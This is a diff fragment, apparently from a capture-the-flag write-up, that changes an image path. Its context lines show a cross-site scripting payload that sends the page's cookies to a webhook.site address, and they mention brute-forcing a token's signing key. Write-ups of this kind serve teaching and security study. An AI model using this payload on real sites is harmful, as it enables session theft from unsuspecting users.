@@ -12,7 +12,7 @@ Content-length: 102
 <script>fetch(`https://webhook.site/7c0b4f46-d927-4d8e-8601-3d70d049fe4c?${document.cookie}`)</script>
 ```
 
-![hook response](hook.png)
+![hook response](imgs/hook.png)
 
 We get the token in the request, after bruting the signing key, we find it as `banana`
 
